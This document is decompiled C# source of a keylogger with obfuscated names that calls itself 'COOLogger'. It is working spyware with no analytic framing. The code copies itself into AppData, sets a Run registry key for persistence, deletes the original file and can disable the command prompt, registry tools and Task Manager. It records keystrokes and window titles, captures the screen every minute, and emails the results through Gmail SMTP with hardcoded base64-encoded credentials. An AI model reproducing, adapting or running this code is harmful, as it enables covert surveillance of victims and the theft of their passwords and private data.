using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class dUtJClTWqTXlvRe
{
	private static string REfBzcKbNRqRcWo = "Ym9vbWdvb2RnYW1lQGdtYWlsLmNvbQ==";

	private static string lJeDuqDUiErBZTw = "bm9vYm5vb2I=";

	private static string yfzFNDirrquSZgL = "smtp.gmail.com";

	private static int XXmqtlKZSCjmHjn = 587;

	private static string iIWPzhjEglyKerf;

	private static string RsPOpXoaeFfqkDz;

	private static string WsRJFQhwSGPmhLN;

	private static string tNTbQvFGEJgmtYl;

	private static string kBFHyYnfQxzUwCQ;

	private static string wmSabZeQJQuHHWa;

	private static int hsmFoLuGLITkyHI = 60000;

	private static string OkxMsLwBaOMGYVr = null;

	private static object CyhuUUvEQsMrPhH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string RpkNPvCVdTytusx = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage ipwNonEtvnNpUSB = new MailMessage();

	private static SmtpClient GkVRFaQHVfOOBnO = new SmtpClient();

	[AccessedThroughProperty("yieTneVisbbPBcy")]
	private static kxMsLwBaOMGYVrO _yieTneVisbbPBcy;

	private static object CORgCDMWRuKcwQK = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox dGkVRFaQHVfOOBn = new RichTextBox();

	private static kxMsLwBaOMGYVrO yieTneVisbbPBcy
	{
		get
		{
			return _yieTneVisbbPBcy;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_yieTneVisbbPBcy != null)
			{
				kxMsLwBaOMGYVrO.KeyDown -= adUtJClTWqTXlvR;
			}
			_yieTneVisbbPBcy = value;
			if (_yieTneVisbbPBcy != null)
			{
				kxMsLwBaOMGYVrO.KeyDown += adUtJClTWqTXlvR;
			}
		}
	} = new kxMsLwBaOMGYVrO();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		wmSabZeQJQuHHWa = Conversions.ToString(true);
		WsRJFQhwSGPmhLN = Conversions.ToString(true);
		tNTbQvFGEJgmtYl = Conversions.ToString(false);
		kBFHyYnfQxzUwCQ = Conversions.ToString(false);
		RsPOpXoaeFfqkDz = Conversions.ToString(true);
		iIWPzhjEglyKerf = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, CyhuUUvEQsMrPhH, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(CyhuUUvEQsMrPhH, (object)"\\ELbCBRHKCaEigOD.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(RpkNPvCVdTytusx + "\\ELbCBRHKCaEigOD.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(CyhuUUvEQsMrPhH, (object)"\\"), CORgCDMWRuKcwQK))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(CyhuUUvEQsMrPhH, (object)"\\"), CORgCDMWRuKcwQK)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(CyhuUUvEQsMrPhH, (object)"\\"), CORgCDMWRuKcwQK)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(CyhuUUvEQsMrPhH, (object)"\\"), CORgCDMWRuKcwQK)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(CyhuUUvEQsMrPhH, (object)"\\"), CORgCDMWRuKcwQK) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(iIWPzhjEglyKerf))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(CORgCDMWRuKcwQK)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(CORgCDMWRuKcwQK), Operators.ConcatenateObject(Operators.ConcatenateObject(CyhuUUvEQsMrPhH, (object)"\\"), CORgCDMWRuKcwQK));
			}
		}
		if (Conversions.ToBoolean(RsPOpXoaeFfqkDz))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(CyhuUUvEQsMrPhH, (object)"\\ELbCBRHKCaEigOD.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(WsRJFQhwSGPmhLN))
		{
			Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(tNTbQvFGEJgmtYl))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(kBFHyYnfQxzUwCQ))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(60000);
		val.add_Tick((EventHandler)LZHYKOocaUmjGbz_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)GCORgCDMWRuKcwQ_Ticked);
		val2.Start();
		yieTneVisbbPBcy.msozDSnoyIDgwPj();
		Application.Run();
	}

	private static string PkmvTBetagzIxdY()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string eREfBzcKbNRqRcW(string LXXmqtlKZSCjmHj)
	{
		byte[] bytes = Convert.FromBase64String(LXXmqtlKZSCjmHj);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void LZHYKOocaUmjGbz_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(wmSabZeQJQuHHWa))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = jDwmSabZeQJQuHH(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(CyhuUUvEQsMrPhH, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(CyhuUUvEQsMrPhH, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(eREfBzcKbNRqRcW(REfBzcKbNRqRcWo));
				mailMessage.To.Add(eREfBzcKbNRqRcW(REfBzcKbNRqRcWo));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = dGkVRFaQHVfOOBn.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(eREfBzcKbNRqRcW(REfBzcKbNRqRcWo), eREfBzcKbNRqRcW(lJeDuqDUiErBZTw));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				dGkVRFaQHVfOOBn.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage mailMessage2 = ipwNonEtvnNpUSB;
		mailMessage2.From = new MailAddress(eREfBzcKbNRqRcW(REfBzcKbNRqRcWo));
		mailMessage2.To.Add(eREfBzcKbNRqRcW(REfBzcKbNRqRcWo));
		mailMessage2.Subject = "COOLogger Logs from - " + Environment.UserName;
		mailMessage2.Body = dGkVRFaQHVfOOBn.get_Text();
		mailMessage2 = null;
		SmtpClient gkVRFaQHVfOOBnO = GkVRFaQHVfOOBnO;
		gkVRFaQHVfOOBnO.Host = "smtp.gmail.com";
		gkVRFaQHVfOOBnO.Port = 587;
		gkVRFaQHVfOOBnO.EnableSsl = true;
		gkVRFaQHVfOOBnO.Credentials = new NetworkCredential(eREfBzcKbNRqRcW(REfBzcKbNRqRcWo), eREfBzcKbNRqRcW(lJeDuqDUiErBZTw));
		gkVRFaQHVfOOBnO.Send(ipwNonEtvnNpUSB);
		gkVRFaQHVfOOBnO = null;
		dGkVRFaQHVfOOBn.set_Text("");
	}

	public static void adUtJClTWqTXlvR(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = dGkVRFaQHVfOOBn;
		val.set_Text(val.get_Text() + yieTneVisbbPBcy.DwmSabZeQJQuHHW(e));
	}

	public static void GCORgCDMWRuKcwQ_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(OkxMsLwBaOMGYVr, PkmvTBetagzIxdY(), false) != 0)
		{
			OkxMsLwBaOMGYVr = PkmvTBetagzIxdY();
			if (Operators.CompareString(OkxMsLwBaOMGYVr, "", false) != 0)
			{
				RichTextBox val = dGkVRFaQHVfOOBn;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + OkxMsLwBaOMGYVr + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string jDwmSabZeQJQuHH(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
